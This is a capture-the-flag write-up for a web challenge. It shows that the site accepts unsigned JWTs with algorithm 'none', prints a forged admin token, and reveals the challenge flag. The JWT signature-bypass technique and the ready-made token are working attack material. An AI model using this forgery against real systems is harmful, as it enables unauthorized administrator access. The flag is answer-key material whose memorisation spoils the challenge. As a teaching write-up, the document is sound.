---
solver: Arajtav
points: 200
---

# Description

> Mr. Jay W. Tee seems to think his website is pretty secure.

# Solution

Logging in with any username and password works. You can see a `token` cookie is set. It is a normal JWT. Decoding it shows the payload is

```json
{
    "username": "user",
    "role": "guest"
}
```

You can make a new JWT with following payload

```json
{
    "username": "admin",
    "role": "admin"
}
```

and no signing algorithm (`eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.`).
Sending a GET to `/admin` with this token returns the flag `boroCTF{n0_s1gn4tur3_n0_pr0bl3m^^}`.
